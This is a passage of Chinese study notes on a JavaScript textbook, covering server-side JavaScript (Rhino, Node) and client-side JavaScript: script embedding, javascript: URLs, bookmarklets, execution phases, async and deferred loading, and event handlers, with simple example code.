第11章 JavaScript的子集和扩展
-----------------------------
**11.1javascript的子集**
**11.2常量和局部变量**
**11.3解构赋值**
**11.4迭代**
**11.5函数简写**
**11.6多catch从句**
**11.7e4x:ecmascript for xml

第12章 服务器端javascript
-------------------------

前面的章节已经介绍了javascript语言核心，我们即将开始本书的第二部分，该部分会介绍javascript嵌入web浏览器的原理，并涵盖庞杂的客户端JavaScript API。可以说javascript是基于web的编程语言，因为绝大部分javascript代码是为web浏览器而编写的。但是作为一门高效和通用的语言，javascript理所当然能用于其他编程工作。所以在过渡到服务端javascript之前，我们先快速了解一下另外两种javascript嵌入。
Rhino是基于Java的javascript解析器，实现了通过javascript程序访问整个Java API，12.1节将会介绍它。
Node是Google的V8 javascript解析器的一个特别版本，它在底层绑定了POSIX（Unix）API，包括文件、进程、流和套接字等，并侧重于异步I/O、网络和HTTP。12.2节将会介绍它。Node是其官方名字，Node.js是非官方的名字，用于和其他node区分，[具体内容见](https://github.com/nodejs/node/wiki)

本章标题表明本章是关于“服务器端”的javascript，Node和Rhino常用于创建脚本服务器。但“服务器”这个词也意味着“Web浏览器之外的任何事情”。Rhino程序能使用Java的Swing框架创建图形UI，而Node上运行的javascript程序可以像shell脚本那样去操作文件。

本章非常简短，仅准备重点介绍在web浏览器之外使用javascript的一些方式；不会尝试全面介绍Rhino和Node，第三部分也不会包涵这里讨论的API；并且不会详细介绍Java平台或POSIX API，接下来关于Rhino的章节假定读者有一定的Java经验，关于Node的章节假定读者有一定的底层Unix API的经验。

**12.1用rhino脚本化java**
**12.2用node实现异步i/o**

#第二部分 客户端javascript

本书第二部分主要讲解javascript是如何在web浏览器中实现的，这些章节介绍了大量的脚本宿主对象，这些对象可以表示浏览器窗口、文档树和文档的内容等。这些章节同样涵盖重要的web应用所需的网络编程API、本地存储和检索数据、画图等。

第13章 web浏览器中的javascript
-----------------------------

本书第一部分介绍了javascript语言核心。第二部分开始转向web浏览器中javascript的讨论，通常称为客户端javascript。迄今为止，我们多看到的大部分例子虽然是合法的javascript代码，但是却没有特定的上下文，也就是说它们不过是一些运行在不明环境中的代码片段。本章提供了一个可以运行javascript的上下文。

在开始讨论javascript之前，有必要先思考一下在web浏览器中是如何呈现web页面的。一些呈现静态信息的页面，叫做文档（document）（由于加入了javascript，静态页面的信息看上去会动来动去，但信息本身是静态的），相对于文档来说，其他web页面则感觉上更像是应用。如果需要的话，这些页面可以动态载入新的信息，因此看起来更加图形化，而非文本化，并且它们可以进行离线操作，以及保存数据到本地，以便再次访问时进行状态恢复。此外，还有其他web页面处于文档和应用的中间，结合了两者的特性。

本章以客户端javascript概述开始，包括一个简单的例子，以及对javascript在web文档和web应用中角色的讨论。概述内容还介绍了哪些内容在后续章节中会有，接下来会详细解释javascript代码在html文档中是如何嵌入并执行的，然后还会介绍兼容性，可访问性和安全性等问题。

**13.1客户端javascript**

window对象是所有客户端javascript特性和API的主要接入点。它表示web浏览器的一个窗口或窗体，并且可以用标识符window来引用它。window对象定义了一些属性，比如，指代Location对象的location属性，Location对象指定当前显示在窗口中的URL，并允许脚本往窗口里载入新的URL：
```javascript
//设置location属性，从而跳转到新的web页面
window.location = "http://www.oreilly.com/";
```
window对象还定义了一些方法，比如alert()，可以弹出一个对话框用来显示一些信息。还有setTimeout()，可以注册一个函数，在给定的一段时间之后触发一个回调：
```javascript
//等待两秒，然后说 hello
setTimeout(function() {alert("hello world");}, 2000);
```
注意上面的代码并没有显式地使用window属性。在客户端javascript中，Window对象也是全局对象。这意味着Window对象处于作用域链的顶部，它的属性和方法实际上是全局变量和全局函数。Window对象有一个引用自身的属性，叫做window。如果需要引用窗口对象本身，可以用这个属性，但是如果只是想要引用全局窗口对象的属性，通常并不需要用到window。

Window对象还定义了很多其他重要的属性、方法和构造函数，参见第14章查看完整的细节。

Window对象中其中一个最重要的属性是document，它引用Document对象，后者表示显示在窗口中的文档。Document对象有一些重要方法，比如getElementById()，可以基于元素id属性的值返回单一的文档元素（表示HTML标签的一对开始/结束标记，以及它们之间的所有内容）：
```javascript
//查找id="timestamp"的元素
var timestamp = document.getElementById("timestamp");
```
getElementById()返回的Element对象有其他重要的属性和方法，比如允许脚本获取它们内容，设置属性值等：
```javascript
//如果元素为空，往里面插入当前的日期和时间
if(timestamp.firstChild == null)
    timestamp.appendChild(document.createTextNode(new Date().toString()));
```
查询、遍历和修改文档内容的方法会在15章介绍。

每个Element对象都有style和className属性，允许脚本指定文档元素的CSS样式，或修改应用到元素上的CSS类名。设置这些CSS相关的属性会改变文档元素的呈现：
```javascript
//显式修改目标元素的呈现
timestamp.style.backgroundColor = "yellow";
//或者只改变类，让样式表指定具体内容
timestamp.className = "highlight";
```
第16章会介绍style和className属性，以及其他CSS编程技术。

Window、Document和Element对象上另一个重要的属性集合是事件处理程序相关的属性。可以在脚本中为之绑定一个函数，这个函数会在某个事件发生时以异步的方式调用。事件处理程序可以让javascript代码修改窗口、文档和组成文档的元素的行为。事件处理程序的属性名是以单词“on”开始的，用法如下：
```javascript
//当用户单击timestamp元素时，更新它的内容
timestamp.onclick = function() { this.innerHTML = new Date().toString(); }
```
Window对象的onload处理程序是最重要的事件处理程序之一。当显示在窗口中的文档内容稳定并可以操作时会触发它。JavaScript代码通常封装在onload事件处理程序里。第17章将会详细讲述事件。例13-1是onload处理程序的演示，并展示了客户端javascript的实例代码，包括查询文档元素、修改css类和定义事件处理程序。这个例子的javascript代码是放置在html的script标签之内的，且在13.2节会对它进行解释。注意代码里的一个函数是在另一个函数里定义的。因为事件处理程序的广泛使用，使得嵌套函数在客户端javascript中非常普遍。

例13-1显示内容的简单客户端javascript

```html
<!DOCTYPE html>
<html>
<head>
<style>
/* CSS styles for this page 本页的CSS样式表 */
/* Children of class="reveal" are  not shown  class="reveal"的元素的子元素都不显示*/
.reveal * { display: none; }  
/* Except for the class="handle" child  除了class="handle"的元素*/
.reveal *.handle { display: block;} 
</style>
<script>
// Don't do anything until the entire document has loaded
// 所有的页面逻辑在onload事件之后启动
window.onload = function() {
    // Find all container elements with class "reveal"
    // 找到所有class名为“reveal”的容器元素
    var elements = document.getElementsByClassName("reveal");
    for(var i = 0; i < elements.length; i++) {  // For each one... 对每个元素进行遍历
        var elt = elements[i];
        // Find the "handle" element with the container
        // 找到容器中的“handle”元素
        var title = elt.getElementsByClassName("handle")[0];
        // When that element is clicked, reveal the rest of the content
        // 当单击这个元素时，呈现剩下的内容
        title.onclick = function() {
            if (elt.className == "reveal") elt.className = "revealed";
            else if (elt.className == "revealed") elt.className = "reveal";
        }
    }
};
</script>
</head>
<body>
<div class="reveal">
<h1 class="handle">Click Here to Reveal Hidden Text</h1>
<p>This paragraph is hidden. It appears when you click on the title.</p>
</div>
</body>
</html>
```

在本章的概要介绍中提到了，一些web页面感觉上像文档，而另一些则像应用。接下来的两节会探讨javascript在两种web页面类型里是如何使用的。

**13.1.1Web文档里的javascript**

javascript程序可以通过document对象和它包含的element对象遍历和管理文档内容。它可以通过操纵css样式和类，修改文档内容的呈现。并且可以通过注册适当的事件处理程序来定义文档元素的行为。内容、呈现和行为的组合，叫做动态HTML或DHTML，会在第15~17章里介绍。

Web文档里应当少量地使用javascript，因为javascript真正的角色是增强用户的浏览体验，使信息的获取和传递更容易。用户的体验不应依赖于javascript，但javascript可以增强体验，比如通过下面的方式：

* 创建动画和其他视觉效果，巧妙地引导和帮助用户进行页面导航。
* 对表格的列进行分组，让用户更容易地找到所需要的。
* 隐藏某些内容，当用户“深入”到内容里时，再逐渐展示详细信息。  



**13.1.2Web应用里的javascript**

在web文档中使用的javascript DHTML特性在web应用中都会用到，对于web应用来说，除了内容、呈现和操作API之外，还依赖web浏览器环境提供的更基础的服务。

要真正理解web应用，需要先认识到web浏览器已经有了很好的发展，现在已经不仅仅是作为显示文档的工具的角色了，而逐渐变成了一个简易的操作系统。想一下，传统操作系统允许组织桌面和文件夹里的图标（表示文件或应用）；web浏览器允许在工具栏和文件夹例组织书签（表示文档和web应用）。系统可以在一个窗口里运行多个应用；web浏览器可以在一个标签里显示多个文档。操作系统定义了很多底层网络API、提供绘制图像、保存文件等功能。web浏览器也定义底层网络API（第18章）、保存数据（第20章）和绘制图像（第21章）。

谨记web浏览器是简单操作系统的概念，这样就可以把web应用定义为用javascript访问更多浏览器提供的高级服务（比如网络、图像和数据存储）的web页面。高级服务里最有名的是XMLHttpRequest对象，后者可以对HTTP请求编程来启用网络。web应用使用这个服务从服务器获取新信息，而不用重新载入页面。类似这样的web应用通常叫做Ajax应用，Ajax构成了“web2.0”的脊梁。XMLHttpRequest会在第18章详细介绍。

HTML5标准（在撰写本书时还是草案）和相关标准为web应用定义了很多其他重要的API。这些API包括21章和第20章的数据存储和图像API，以及很多其他特性的API，如地理位置信息、历史管理和后台线程。在实现这些API之后，会开启一场Web应用的功能的革命。这些API会在第22章中介绍。

当然，javascript在web应用里会比在web文档里显得更加重要。javascript增强了web文档，但是设计良好的文档需要在禁用javascript后还能继续工作。web应用本质上就是javascript程序，后者使用由web浏览器提供的操作系统类型的服务，并且不用期望它们在禁用浏览器脚本后还能正常工作。（利用HTML表单提交的方式和服务器CGI脚本进行通信的交互式web页面，是原始的“web应用”，可以不用javascript来实现。但是，我们不会在本书中讨论这种web应用类型。）

**13.2在html里嵌入javascript**

在html文档里嵌入客户端javascript代码有4种方法：

* 内联，放置在script标签对之间。
* 放置在由script标签的src属性指定的外部文件中。
* 放置在html事件处理程序中，该事件处理程序由onclick或onmouseover这样的html属性指定。
* 放在一个URL里，这个url使用特殊的“javascript:”协议。  


接下来的小节会逐一解释这4种javascript嵌套技术。但是，值得注意的是，html事件处理程序属性的javascript:URL这两种方式在现代javascript代码里已经很少使用（它们在web早期多少有点通用）。内联脚本（没有src属性）也比它们之前用得少了。有个编程哲学叫“Unobtrusive JavaScript”，主张内容（html）和行为（javascript代码）应该尽量地保持分离。根据这个编程哲学，javascript最好通过script元素的src属性来嵌入HTML文档里。Unobtrusive（不显眼） JavaScript是一种将Javascript从HTML结构中抽离的设计概念，避免在HTML标签中夹杂一堆onchange、onclick等属性去挂载javascript事件，让html与javascript分离，依MVC的原则将功能权贵区分清楚，使HTMl也变得结构化容易阅读。

**13.2.1 script元素**

javascript代码可以以内联的形式出现在html文件里的script标签之间:

    <script> //这里是你的javascript代码</script>

在XHTML中，script标签中的内容被当做其他内容一样对待。如果javascript代码包含了“<”或“&”字符，那么这些字符就被解释成为XML标记。因此，如果要使用XHTML，最好把所有的javascript代码放入到一个CDATA部分里：

    <script><![CDATA[//这里是你的javascript代码]]></script>

例13-2展示了一个HTML文件，它包含简单的javascript程序。注释解释了这个程序是做什么的，但这个例子主要演示的是javascript代码以及css样式表是如何嵌入到html文件里。注意这个例子和例13-1的结构类似，并同样使用onload事件处理程序。

例13-2： 实现一个简单的javascript数字时钟程序

```html
<!DOCTYPE html>                 <!-- This is an HTML5 file 这是一个HTML5文件-->
<html>                          <!-- The root element 根节点-->
<head>                          <!-- Title, scripts & styles go here 标题、脚本和样式都放在这里 -->
<title>Digital Clock</title>
<script>                        // A script of js code ，js代码
// Define a function to display the current time
// 定义一个函数用以显示当前的时间
function displayTime() {
    var elt = document.getElementById("clock");  // Find element with id="clock"，通过id="clock"找到元素
    var now = new Date();                        // Get current time，得到当前时间
    elt.innerHTML = now.toLocaleTimeString();    // Make elt display it，让elt来显示它
    setTimeout(displayTime, 1000);               // Run again in 1 second，在1秒后再次执行
}
// Start displaying the time when document loads.
// 当onload事件发生时开始显示时间
window.onload = displayTime;  
</script>
<style>                         /* A CSS stylesheet for the clock  钟表的样式*/
#clock {                        /* Style apply to element with id="clock" 定义id="clock"的元素的样式*/
  font: bold 24pt sans;         /* Use a big bold font 使用粗体大号字*/
  background: #ddf;             /* On a light bluish-gray background 定义蓝灰色背景*/
  padding: 10px;                /* Surround it with some space 周围有一圈空白*/
  border: solid black 2px;      /* And a solid black border 定义纯黑色边框*/
  border-radius: 10px;          /* Round the corners (where supported) 定义圆角（如果浏览器支持的话）*/
}
</style>
</head>
<body>                    <!-- The body is the displayed parts of the doc. body部分是用来显示文档的-->
<h1>Digital Clock</h1>    <!-- Display a title 显示标题 -->
<span id="clock"></span>  <!-- The time gets inserted here 输出时钟-->
</body>
</html>
```

**13.2.2外部文件中的脚本**

script标签支持src属性，这个属性指定包含javascript代码的文件的url。它的用法如下：

    <script src="../../scripts/util.js"></script>

javascript文件的扩展名通常是以.js结尾的。它包含纯粹的javascript代码，其中既没有script标签，也没有其他html标签。

具有src属性的script标签的行为就像指定的javascript文件的内容直接出现在标签script之间一样。注意，即便指定了src属性并且script标签之间没有javascript代码，结束的script标签也是不能丢的。在XHTML中，在此处可以使用简短的script标签。

使用src属性时，script标签之间的任何内容都会忽略。如果需要，可以在script标签之间添加代码的补充说明文档或版权信息。但要注意，如果有任何非空格或javascript注释的文本出现在带src属性的script之间，HTML5校验器将会报错。

以下是src属性方式的一些优点：
* 可以把大块javascript代码从html文件中删除，这有助于保持内容和行为的分离，从而简化html文件。
* 如果多个web页面共用相同的javascript代码，用src属性可以让你只管理一份代码，而不用在代码改变时编辑每个html文件。
* 如果一个javascript代码文件由多个页面共享，就只需要下载它一次，通过使用它的第一个页面——随后的页面可以从浏览器缓存检索它。
* 由于src属性的值可以是任意的URL，因此来自一个web服务器的javascript程序或web页面可以使用由另一个服务器输出的代码。很多互联网广告依赖与此。
* 从其他网站载入脚本的能力，可以让我们更好地利用缓存，goolge正在为通用的客户端类库推广标准且好记的url，可以让浏览器只缓存一份副本，并且网络上的任意站点都可以使用。链接javascript代码到google服务器，可以减少web页面的启动时间，因为这些类库已经存在于用户的浏览器缓存中，但是你必须相信第三方提供的代码服务，这对于你的站点来说很关键。[参见](http://code.google.com/apis/ajaxlibs/)查看更多信息。

从文档服务器之外的服务器里载入脚本有重要的安全隐患。13.6.2节介绍的同源安全策略会阻止一个域的文档中的javascript和另一个域的内容进行交互。但是，要注意和脚本本身的来源并没有关系，而是和脚本嵌入的文档的来源有关系。因此，同源策略并不适用于如下情况：即便代码和文档有着不同的来源，javascript代码也可以和它嵌入的文档进行交互。当在页面中用src属性包含一个脚本时，就给了脚本作者（以及从中载入这段脚本的域的网站管理员）完全控制web页面的权限。

**13.2.3脚本类型**

javascript是web的原始脚本语言，而在默认的情况下，假定script元素包含或引用javascript代码。如果要使用不标准的脚本语言，如Microsoft的VBScript（只有IE支持），就必须用type属性指定脚本的MIME类型：

    <script type="text/vbscript">
    这里是VBScript代码
    </script>

type属性的默认值是“text/javascript”。如果需要，可以显式指定此类型，但这完全没必要。

老的浏览器在script标记上用language属性代替type属性，这种情况现在也会经常看到：

    <script language="javascript">
    //这里是javascript代码......
    </script>

language属性已经废弃，不应该再使用了。

当web浏览器遇到script元素，并且这个script元素包含其值不被浏览器识别的type属性时，它会解析这个元素但不会尝试显示或执行它的内容。这意味着可以使用script元素来嵌入任意文本数据到文档里，只要用type属性为数据声明一个不可执行的类型。要获取数据，可以用表示script元素（第15章会解释如何获取这些元素）的HTMLElement对象的text属性。但是，要注意这些数据嵌入技术只对内联脚本生效。如果同时指定src属性和一个未知的类型，那这个脚本会被忽略，并且不会从指定的url下载任何内容。

**13.2.4HTML中的事件处理程序**

当脚本所在的html文件被载入浏览器时，这个脚本里的javascript代码只会执行一次。为了可交互，javascript程序必须定义事件处理程序——web浏览器先注册javascript函数，并在之后调用它作为事件的响应（比如用户输入）。正如本章一开始展示的，javascript代码可以通过把函数赋值给element对象的属性（比如onclick或onmouseover）来注册事件处理程序。（还有其他注册事件处理程序的方法，参见第17章），这个Element对象表示文档里的一个HTML元素。

类似onclick的事件处理程序属性，用相同的名字对应到html属性，并且还可以通过将javascript代码放置在HTML属性里来定义事件处理程序。例如，要定义用户切换表单中的复选框时调用的事件处理程序，可以作为表示复选框的html元素的属性指定处理程序代码：

    <input type="checkbox" name="options" value="giftwrap" onchange="order.options.giftwrap = this.checked;"
    
这里的onchange属性比较有意思。这个属性值里的javascript代码会在用户选择或取消选择复选框时执行。

HTML中定义的事件处理程序的属性可以包含任意条javascript语句，相互之间用逗号分隔。这些语句组成一个函数体，然后这个函数成为对应事件处理程序属性的值。（17.2.2节会详细介绍HTML属性文本到javascript函数的转换。）但是，通常html事件处理程序的属性由类似上面的简单赋值或定义在其他地方的简单函数调用组成。这样可以保持大部分实际的javascript代码在脚本里，而不用把javascript和html混在一起。实际上，很多web开发者认为使用html事件处理程序的属性是不好的习惯，他们更喜欢保持内容和行为的分离。

**13.2.5URL中的javascript**

在url后面跟一个javascript:协议限定符，是另一种嵌入javascript代码到客户端的方式。这种特殊的协议类型指定url内容为任意字符串，这个字符串是会被javascript解释器运行的javascript代码。它被当做单独的一行代码对待，这意味着语句之间必须用分号隔开，而//注释必须用/**/注释代替。javascript:URL能识别的“资源”是转换成字符串的执行代码的返回值。如果代码返回undefined，那么这个资源是没有内容的。

javascript:URL可以用在可以使用常规URL的任意地方：比如a标记的href属性，<form>的action属性，甚至window.open()方法的参数。超链接里的javascript url可以是这样：
```
<a href="javascript:new Date().toLocaleTimeString();">
What time is it?
</a>
```
部分浏览器（比如Firefox）会执行URL里的代码，并使用返回的字符串作为待显示新文档的内容。就像单击一个http: URL链接，浏览器会擦除当前文档并显示新文档。以上代码的返回值并不包含任何HTML标签，但是如果有，浏览器会像渲染通常载入的等价HTML文档一样渲染它们。其他浏览器（比如Chrome和Safari）不允许URL像上面一样覆盖当前文档，它们会忽略代码的返回值。但是，类似这样的url还是支持的：
```
<a href="javascript:alert(new Date().toLocaleTimeString());">
检查时间，而不必覆盖整个文档
</a>
```
当浏览器载入这种类型的URL时，它会执行javascript代码，但是由于没有返回值（alert()方法返回undefined）作为新文档的显示内容，类似Firefox的浏览器并不会替换当前显示的文档。（在这种情况下，javascript:URL和onclick事件处理程序的目的一样。上面的链接通过button元素的onclick处理程序来表示会更好，因为a元素通常应该保留为超链接，用来载入新文档。）如果要确保javascript:URL不会覆盖当前文档，可以用void操作符强制函数调用或给表达式赋予undefined值：
```
<a href="javascript:void window.open('about:blank');">打开一个窗口</a>
```
如果这个URL里没有void操作符，调用window.open()方法返回的值会（在一些浏览器里）被转化为字符串并显示，而当前文档也会覆盖为包含该字符串的文档：
```
[object Window]
```
和HTML事件处理程序的属性一样，JavaScript URL是web早期的遗物，通常应该避免在现代html里使用。
但javascript:URL在html文档之外确实有着重要的角色。如果要测试一小段javascript代码，那么可以在浏览器地址栏里直接输入javascript:URL。下面会介绍javascript:URL另一个正统（且强大的）的用法：浏览器书签。

**书签**

在web浏览器中，“书签”就是一个保存起来的URL。如果书签是javascript:URL，那么保存的就是一小段脚本，叫做bookmarklet。bookmarklet是一个小型程序，很容易就可以从浏览器的菜单或工具栏里启动。bookmarklet里的代码执行起来就像页面上的脚本一样，可以查询和设置文档的内容、呈现和行为。只要书签不返回值，它就可以操作当前显示的任何文档，而不把文档替换成新的内容。

考虑下面a标签里的javascript:URL。单击链接会打开一个简单的javascript表达式计算器，它允许在页面环境中计算表达式和执行语句：
```
<a href='javascript:
    var e = "", r = ""; /*需要计算的表达式和结果*/
    do {
        /*输出表达式和结果，并要求输入新的表达式*/
        e = prompt("Expression:" + e + "\n" + r + "\n", e);
        try{ r = "Result:" + eval(e); } /*尝试计算这个表达式*/
        catch(ex) { r = ex; } /*否则记住这个错误*/
    }while(e); /*直到没有输入表达式或者单击了Cancel按钮才会停止，否则一直循环执行*/
    void 0; /*这句代码用以防止当前文档被覆盖*/
    >'
Javascript Evaluator
</a>
```
注意，即便这个javascriptURL是写成多行的，html解析器仍将它作为单独的一行对待，并且其中的单行//注释也是无效的。还有，要记住代码是单引号中的html属性的一部分，所以代码不可以包含任何单引号。

在开发时，把这样的链接硬编码在页面中是有用的；而把它另存为可以在任何页面上运行的书签，就更有用了。通常，在浏览器里把超链接的地址加入书签可以这样做，在链接上右击并选择类似“Bookmark Link”的选项，或者拖动链接到书签工具栏。

**13.3javascript程序的执行**

客户端javascript程序没有严格的定义。我们可以说javascript程序是由web页面中所包含的所有javascript代码（内联脚本、html事件处理程序和javascript:URL）和通过script标签的src属性引用的外部javascript代码组成的。所有这些单独的代码共用同一个全局window对象。这意味着它们都可以看到相同的Document对象，可以共享相同的全局函数和变量的集合：如果一个脚本定义了新的全局变量或函数，那么这个变量或函数会在脚本执行之后对任意javascript代码可见。

如果web页面包含一个嵌入的窗体（通常使用iframe元素），嵌入文档中的javascript代码和嵌入文档里的javascript代码会有不同的全局对象，它可以当做一个单独的javascript程序。但是，要记住，没有严格的关于javascript程序范围的定义。如果外面和里面的文档来自于同一个服务器，那么两个文档中的代码就可以进行交互，并且如果你愿意，就可以把它们当做是同一个程序的两个相互作用的部分。14.8.3节会详细介绍全局window对象以及不同窗口和窗体之间的交互。

bookmarklet里的javascript:URL存在于文档之外，可以想象成是一种用户扩展或者对于其他程序的修改。当用户执行一个bookmarklet时，书签里的javascript代码就可以访问全局对象和当前文档的内容，以及对它进行操作。

javascript程序的执行有两个阶段。在第一个阶段，载入文档内容，并执行script元素里的代码（包括内联脚本和外部脚本）。脚本通常（但不总是，参见13.3.1节）会按它们在文档里的出现顺序执行。所有脚本里的javascript代码都是从上往下，按照它在条件、循环以及其他控制语句中的出现顺序执行。

当文档载入完成，并且所有脚本执行完成后，javascript执行就进入它的第二阶段。这个阶段是异步的，而且由事件驱动的。在事件驱动阶段，web浏览器调用事件处理程序函数（由第一阶段里执行的脚本指定的html事件处理程序，或之前调用的事件处理程序来定义），来响应异步发生的事件。调用事件处理程序通常是响应用户输入（如鼠标单击，键盘按下等）。但是，还可以由网络活动、运行时间或者javascript代码中的错误来触发。第17章会详细介绍事件和事件处理程序。13.3.2节也会进行更多讨论。注意，嵌入在web页面里的javascript:URL也可以被当做是一种事件处理程序，因为直到用户通过单击链接或提交表单来激活之后它们才会有效果。

事件驱动阶段里发生的第一个事件是load事件，指示文档已经完全载入，并可以操作。javascript程序经常用这个事件来触发或发送消息。我们会经常看到一些定义函数的脚本程序，除了定义一个onload事件处理程序函数外不做其他操作，这个函数会在脚本事件驱动阶段开始时被load事件触发。正是这个onload事件会对文档进行操作，并做程序想做的任何事。javascript程序的载入阶段是相对短暂的，通常只持续1~2秒。在文档载入完成之后，只要web浏览器显示文档，事件驱动阶段就会一直持续下去。因为这个阶段是异步的和事件驱动的，所以可能有长时间处于不活动状态，没有javascript被执行，被用户或网络事件触发的活动打断。13.3.4节会详细介绍javascript执行的两个阶段。

核心javascript和客户端javascript都有一个单线程执行模型。脚本和事件处理程序（无论如何）在同一个时间只能执行一个，没有并发性。这保持了javascript编程的简单性，在13.3.3节会介绍。

**13.3.1同步、异步和延迟的脚本**

javascript第一次添加到web浏览器时，还没有API可以用来遍历和操作文档的结构和内容。当文档还在载入时，javascript影响文档内容的唯一方法是快速生成内容。它使用document.write()方法完成上述任务。例13-3展示了1996年最先进的javascript代码的样子。

例13-3 载入时生成文档内容
```
<h1>Table of Factorials</h1>
<script>
function factorial(n) {
    if(n<=1) return n;          //用来计算阶乘的函数
    else return n*factorial(n-1);
}
document.write("<table>");  //开始创建HTML表
document.write("<tr><th>n</th><th>n!</th></tr>"); //输出表头
for(var i = 1; i <= 10; i++) {
    document.write("<tr><td>"+ i + "</td><td>" + factorial(i) + "</td></tr>");
}
document.write("</table>"); //表格结束
document.write("Generated at" + new Date()); //输出时间戳
</script>
```
当脚本把文本传递给document.write()时，这个文本被添加到文档输入流中，HTML解析器会在当前位置创建一个文本节点，将文本插入这个文本节点后面。我们并不推荐使用document.write()，但在某些场景下它有着重要的用途（见15.10.2节）。当HTML解析器遇到script元素时，它默认必须先执行脚本，然后再恢复文档的解析和渲染。这对于内联脚本没什么问题，但如果脚本源代码是一个由src属性指定的外部文件，这意味着脚本后面的文档部分在下载和执行脚本之前，都不会出现在浏览器中。作者在这里的表述很模糊，所谓“不会出现在浏览器中”是指文档的文本内容已经载入，但是并未被浏览器引擎解析为DOM树，而DOM树的生成是受javascript代码执行的影响的，javascript代码会“阻塞”页面UI的渲染。

脚本的执行只在默认情况下是同步和阻塞的。script标签可以有defer和async属性，这（在支持它们的浏览器里）可以改变脚本的执行方式。这些都是布尔属性，没有值；只需要出现在script标签里即可。html5说这些属性只在和src属性联合使用时才有效，但有些浏览器还支持延迟的内联脚本：
```
<script defer src="deferred.js"></script>
<script async src="async.js"></script>
```
defer和async属性都像在告诉浏览器链接进来的脚本不会使用document.write()，也不会生成文档内容，因此浏览器可以在下载脚本时继续解析和渲染文档。defer属性使得浏览器延迟脚本的执行，直到文档的载入和解析完成，并可以操作。async属性使得浏览器可以尽快地执行脚本，而不用在下载脚本时阻塞文档解析。如果script标签同时有两个属性，同时支持两者的浏览器会遵从async属性并忽略defer属性。

注意，延迟的脚本会按它们在文档里的出现顺序执行。而异步脚本在它们载入后执行，这意味着它们可能会无序执行。

在撰写本书的时候，async和defer属性还没有广泛实现，它们只被一些优化建议所考虑。即便延迟和异步的脚本会同步执行，web页面应该还可以正常工作。

甚至可以在不支持async属性的浏览器里，通过动态创建script元素并把它插入到文档中，来实现脚本的异步载入和执行。例13-4里的loadasync()函数完成了这个工作。第15章会介绍它使用的技术。

例13-4 异步载入并执行脚本  
```javascript
// Asynchronously load and execute a script from a specified URL
// 异步载入并执行一个指定URL中的脚本 
function loadasync(url) { 
    var head = document.getElementsByTagName("head")[0]; // Find document <head>，找到head元素
    var s = document.createElement("script");  // Create a <script> element，创建一个script元素
    s.src = url;                               // Set its src attribute ，设置其src属性
    head.appendChild(s);                       // Insert the <script> into head，将script元素插入head标签中  
}
```
注意这个loadsync()函数会动态地载入脚本——脚本载入到文档中，成为正在执行的javascript程序的一部分，既不是通过web页面内联包含，也不是来自web页面的静态引用。  

**13.3.2事件驱动的javascript**

例13-3里展示的古老的javascript程序是同步载入的程序：在页面载入时开始执行，生成一些输出，然后结束。这种类型的程序在今天已经不常见了。反之，我们通过注册事件处理程序函数来写程序。之后在注册的事件发生异步调用这些函数。例如，想要为常用操作启动键盘快捷键的web应用会为键盘事件注册事件处理程序。甚至非交互的程序也使用事件。假如想要写一个分析文档结构并自动生成文档内容的表格的程序。程序不需要用户输入事件的事件处理程序，但它还是会注册onload事件处理程序，这样就可以知道文档在什么时候载入完成并可以生成内容表格了。

事件和事件处理是第17章的主题，但是这一节会提供一个快速概览。事件都有名字，比如click、change、load、mouseover、keypress或readystatechange，指示发生的事件的通用类型。事件还有目标，它是一个对象，并且事件就是在它上面发生的。当我们谈论事件的时候，必须同时指定事件类型（名字）和目标：比如，一个单击事件发生在HTMLButtonElement对象上，或者一个readystatechange事件发生在XMLHttpRequest对象上。

如果想要程序响应一个事件，写一个函数，叫做“事件处理程序”、“事件监听器”或“回调”。然后注册这个函数，这样他就会在事件发生时调用它。正如前面提到的，这可以通过HTML属性来完成，但是我们不鼓励将javascript代码和html内容混淆在一起。反之，注册事件处理程序最简单的方法是把javascript函数赋值给目标对象的属性，类似这样的代码：
```javascript
window.onload = function() { ... };
document.getElementById("button1").onclick = function() { ... };
function handleResponse() { ... }
request.onreadystatechange = handleResponce;
```
注意，按照约定，事件处理程序的属性的名字是以“on”开始，后面跟着事件的名字。还要注意在上面的任何代码里没有函数调用：只是把函数本身赋值给这些属性。浏览器会在事件发生时执行调用。用事件进行异步编程会经常涉及嵌套函数，也经常要在函数的函数里定义函数。

对于大部分浏览器中的大部分事件来说，会把一个对象传递给事件处理程序作为参数，那个对象的属性提供了事件的详细信息。比如，传递给单击事件的对象，会有一个属性说明鼠标的哪个按钮被单击。（在IE里，这些事件信息被存储在全局event对象里，而不是传递给处理程序函数。）事件处理程序的返回值有时用来指示函数是否充分处理了事件，以及阻止浏览器执行它默认会进行的各种操作。

有些事件的目标是文档元素的，它们会经常往上传递给文档树，这个过程叫做“冒泡”。例如，如果用户在button元素上单击鼠标，单击事件就会在按钮上触发。如果注册在按钮上的函数没有处理（并且冒泡停止）该事件，事件会冒泡到按钮嵌套的容器元素，这样，任何注册在容器元素上的单击事件都会调用。

如果需要为一个事件注册多个事件处理程序函数，或者想要写一个可以安全注册事件处理程序的代码模块，就算另一个模块已经为相同的目标上的相同的事件注册了一个处理程序，也需要用到另一种事件处理程序注册技术。大部分可以成为事件目标的对象都有一个叫做addEventListenter()方法，允许注册多个监听器：
```javascript
window.addEventListener("load",function() { ... }, false);
request.addEventListener("readystatechange",function() { ... }, false);
```
注意这个函数的第一个参数是事件的名称。虽然addEventListener()已经标准化超过了十年，而微软目前只有在IE9里实现了它。在IE8以及之前的浏览器中，必须使用一个相似的方法，叫做attachEvent():
```javascript
window.attachEvent("onload", function() { ... });
```
参见第17章查看更多关于addEventListener()和attachEvent()的内容。

客户端javascript程序还使用异步通知类型，这些类型往往不是事件。如果设置window对象的onerror属性为一个函数，会在发生（参阅章14.6节）javascript错误（或其他未捕获的异常）时调用函数。还有，setTimeout()和setInterval()函数（这些是window对象的方法，因此是客户端javascript的全局函数）会在指定的一段时间之后触发指定函数的调用。传递给setIimeout()的函数和真实事件处理程序的注册不同，它们通常叫做“回调逻辑”而不是“处理程序”，但它们和事件处理程序一样，也是异步的。参见14.1节获得更多关于setTimeout()和setInterval()的信息。

例13-5演示了setTimeout()、addEventListener()和attachEvent()，定义一个onload()函数注册在文档载入完成时执行的函数。onload()是非常有用的函数，我们会在本书后面的例子中用到它。
例13-5 onload()，当文档载入完成时调用一个函数
```javascript
// Register the function f to run when the document finishes loading.
// 注册函数f，当文档载入完成时执行这个函数f
// If the document has already loaded, run it asynchronously ASAP.
// 如果文档已经载入完成，尽快以异步方式执行它
function onLoad(f) {
    if (onLoad.loaded)                  // If document is already loaded，如果文档已经载入完成
        window.setTimeout(f, 0);        // Queue f to be run as soon as possible，将f放入异步队列，并尽快执行它
